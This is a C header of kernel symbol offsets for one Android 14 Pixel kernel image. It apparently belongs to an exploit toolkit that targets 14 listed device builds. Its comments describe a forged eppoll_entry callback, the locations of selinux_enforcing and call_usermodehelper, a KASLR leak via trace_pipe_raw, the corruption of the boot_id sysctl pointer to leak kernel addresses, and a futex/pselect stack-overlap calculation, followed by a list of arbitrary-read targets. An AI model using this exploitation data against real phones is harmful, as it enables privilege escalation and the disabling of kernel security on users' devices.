/* android14-6.1-ab14791245 -- offsets into one kernel image, shared by every build that ships it.
 *
 * Named for the banner that identifies the image, which is the thing these
 * are offsets into:
 *
 *   Linux version 6.1.157-android14-11-gbd23337e42e7-ab14791245
 *
 * Shipped by 14 of the device-builds in data/targets.json, whose Images are
 * byte-identical (md5 1fd9a88f4233):
 *
 *   akita-CP2A.260805.005
 *   bluejay-CP2A.260705.006
 *   caiman-CP2A.260705.006
 *   cheetah-CP2A.260705.006
 *   comet-CP2A.260705.006
 *   husky-CP2A.260705.006
 *   komodo-CP2A.260705.006
 *   lynx-CP2A.260705.006
 *   oriole-CP2A.260705.006
 *   panther-CP2A.260705.006
 *   raven-CP2A.260705.006
 *   shiba-CP2A.260705.006
 *   tegu-CP2A.260705.006
 *   tokay-CP2A.260705.006
 *
 * A symbol offset is a fact about an image, not about a phone, which is why it
 * is stated once here rather than per device: one image, one set of values, one
 * place to correct them.
 *
 * Derived by tools/pixel-image/derive_offsets.py from the image itself; the
 * same command re-derives them, and --compare checks a committed header
 * against the image it claims to describe.
 */
#ifndef ANDROID14_6_1_AB14791245_H
#define ANDROID14_6_1_AB14791245_H

/* the wake callback a forged eppoll_entry names as its .func */
#ifndef EP_POLL_CALLBACK_OFF
#define EP_POLL_CALLBACK_OFF        0x00402f68ULL
#endif
/* the version string, as a read target that identifies itself */
#ifndef LINUX_BANNER_OFF
#define LINUX_BANNER_OFF            0x012ccc88ULL
#endif
/* every registered input_dev is on this list, so a leaked one is findable by name */
#ifndef INPUT_DEV_LIST_OFF
#define INPUT_DEV_LIST_OFF          0x0215d238ULL
#endif

// ── Kernel release ──
// Encoded as (major<<16)|(minor<<8)|min(patch,255) so a stage can refuse at
// build time a vehicle whose structure only exists from a given release,
// instead of discovering it on the device.
#define KERNEL_VERSION_CODE               0x06019d  // 6.1.157
// ── Symbol offsets from the image base ──
#define ASHMEM_IOCTL_OFF                  0x00c38d28ULL
#define ASHMEM_MMAP_OFF                   0x00c396b8ULL
#define ASHMEM_OPEN_OFF                   0x00c398d8ULL
#define ASHMEM_RELEASE_OFF                0x00c39960ULL
#define ASHMEM_SHOW_FDINFO_OFF            0x00c39a80ULL
// &ashmem_miscs[0].fops = ashmem_miscs + offsetof(miscdevice, fops=0x10)
#define ASHMEM_MISC_FOPS_OFF              0x0217cb80ULL
#define ASHMEM_FOPS_OFF                   0x01280b50ULL
#define ASHMEM_COMPAT_IOCTL_OFF           0x00c39660ULL
#define CONFIGFS_READ_ITER_OFF            0x00464400ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF       0x00464930ULL
// 6.1 has no copy_splice_read: configfs uses generic_file_splice_read
#define COPY_SPLICE_READ_OFF              0x003e5fd4ULL
#define NOOP_LLSEEK_OFF                   0x003986dcULL
#define INIT_TASK_OFF                     0x0201f640ULL
#define ROOT_TASK_GROUP_OFF               0x02208580ULL
// runtime selinux_enforcing = selinux_state.enforcing = selinux_state + 0
#define SELINUX_ENFORCING_OFF             0x0225a420ULL
#define SELINUX_BLOB_SIZES_OFF            0x015ceb88ULL
#define SECURITY_HOOK_HEADS_OFF           0x015ce478ULL
#define KMALLOC_CACHES_OFF                0x015cdfb8ULL
#define ANON_PIPE_BUF_OPS_OFF             0x01109910ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d36f4ULL
#define SYSTEM_UNBOUND_WQ_OFF             0x0200ae60ULL
/* The wake callback an event-poll registration installs on a watched object. */
#define EP_POLL_CALLBACK_OFF              0x00402f68ULL
#define LINUX_BANNER_OFF                  0x012ccc88ULL
#define INPUT_DEV_LIST_OFF                0x0215d238ULL
/* The eventpoll file_operations, which a forged file is checked against. */
#define EVENTPOLL_FOPS_OFF                0x0110bc70ULL
#define WPOKE_PRIV_OFF                    0x02010508ULL
#define EVENTPOLL_FOPS                    (KIMAGE_TEXT_BASE + EVENTPOLL_FOPS_OFF)
// ── Slide references ──
// Symbols a text-base recovery reads or reaches through.
// nfulnl_logger struct (registered via nf_log_register(NFPROTO_UNSPEC,...)).
#define SLIDE_NFULNL_LOGGER_OFF           0x020129d0ULL
// loggers[0][NF_LOG_TYPE_ULOG=1] = loggers + 8  (holds &nfulnl_logger)
#define SLIDE_LOGGERS_0_1_OFF             0x02012920ULL
// 6.1 serves /proc/sys/kernel/random/boot_id from sysctl_bootid[16]
// (drivers/char/random.c: ctl_table .data = &sysctl_bootid). No separate
// random_boot_id exists on 6.1.
//
// The slide write must corrupt random_table[4].data (the .data pointer of
// the boot_id ctl_table entry), NOT sysctl_bootid itself. proc_do_uuid()
// then treats the corrupted pointer as the buffer address and reads 16
// bytes from there (the contents of loggers[0][1] = &nfulnl_logger).
// random_table @ 0x2137c00; entry idx4 (boot_id) * 0x40 + data@0x8 = 0x2137d08.
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF     0x02137d08ULL
// sysctl_bootid buffer itself (restore_slide_boot_id writes &sysctl_bootid
// back into random_table[4].data via SLIDE_SYSCTL_BOOTID).
#define SLIDE_SYSCTL_BOOTID_OFF           0x0227b498ULL
// Write-free KASLR (cves/lib/kaslr/README.md): tracing_mark_write stores its own
// code address (_THIS_IP_ = tracing_mark_write+0x164) into the trace ring
// buffer print_entry.ip; a raw read of trace_pipe_raw returns it unmasked.
// stext = leaked_ip - SLIDE_TRACE_MARK_IP_OFF.
#define SLIDE_TRACE_MARK_IP_OFF           0x001f0ac8ULL
// 6.1 slide uses loggers[0][1] (= SLIDE_LOGGERS_0_1) as the rb parent
// whose content is leaked.
#define SLIDE_LOGGER_PARENT               SLIDE_LOGGERS_0_1
#define MM_OWNER_OFF                      0x338
#define WAITER_LOCAL_OFF                  0x80
#define WAITER_TREE_ENTRY_OFF             0x00
#define WAITER_PI_TREE_ENTRY_OFF          0x18
#define WAITER_TASK_OFF                   0x30
#define WAITER_LOCK_OFF                   0x38
#define WAITER_WAKE_STATE_OFF             0x40
#define WAITER_PRIO_OFF                   0x44
#define WAITER_DEADLINE_OFF               0x48
#define WAITER_WW_CTX_OFF                 0x50
#define FOPS_POST_LLSEEK_OFF              0x10
#define SKB_DATA_DELTA                    (-0xe80LL)
// DIVERGENCE: overrides slide.c's 0, the 6.6 value. It is where
// futex_wait_requeue_pi's on-stack rt_mutex_waiter lands relative to
// core_sys_select's stack_fds array, both
// measured from the same syscall-entry sp, so it falls out of this kernel's
// compiled stack frames. Read off the prologues of this image:
//
//   __arm64_sys_pselect6    sub sp, sp, #0x90
//   core_sys_select         sub sp, sp, #0x1c0 ; add x23, sp, #0x50  <- bits
//     => fd_sets   = sp_entry - 0x90 - 0x1c0 + 0x50  = sp_entry - 0x200
//
//   __arm64_sys_futex       sub sp, sp, #0x70
//   do_futex                sub sp, sp, #0x60
//   futex_wait_requeue_pi   sub sp, sp, #0x1b0 ; add x2, sp, #0x98   <- rt_waiter
//     (confirmed twice: same sp+0x98 is passed to rt_mutex_wait_proxy_lock
//      as its waiter argument and to rt_mutex_cleanup_proxy_lock)
//     => rt_waiter = sp_entry - 0x70 - 0x60 - 0x1b0 + 0x98 = sp_entry - 0x1e8
//
//   shift = (0x200 - 0x1e8) / 8 = 3 words
//
// All five frames are fixed-size with a single prologue adjustment, so there
// is no dynamic stack sizing to account for. With the waiter being 0x58 bytes
// (11 words), words 3..13 are used, which still lands inside in/out/ex
// (words 0..14) and never reaches the res_* half that core_sys_select memsets.
#define SLIDE_PSELECT_WORD_SHIFT          3

#define AAR_TARGETS(X) \
	X(0x020daa80ULL) /* super_blocks    */ \
	X(0x020ad430ULL) /* modules         */ \
	X(0x020b32a8ULL) /* cgroup_roots    */ \
	X(0x0213bf60ULL) /* dpm_list        */ \
	X(0x0210acb8ULL) /* crypto_alg_list */ \
	X(0x0211e730ULL) /* pci_root_buses  */ \
	X(0x020d2f20ULL) /* vmap_area_list  */

#endif /* ANDROID14_6_1_AB14791245_H */
